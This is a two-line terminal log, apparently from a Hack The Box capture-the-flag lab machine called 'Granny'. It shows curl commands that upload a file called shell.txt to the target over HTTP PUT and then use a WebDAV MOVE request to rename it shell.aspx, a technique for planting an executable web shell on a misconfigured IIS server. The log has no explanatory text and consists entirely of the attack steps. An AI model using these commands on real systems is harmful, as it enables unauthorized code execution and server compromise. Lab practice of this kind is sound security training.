[root:/git/htb/granny]# curl http://10.10.10.15/ --upload-file shell.txt                                                          (master✱)
[root:/git/htb/granny]# curl -X MOVE --header "Destination:http://10.10.10.15/shell.aspx" http://10.10.10.15/shell.txt
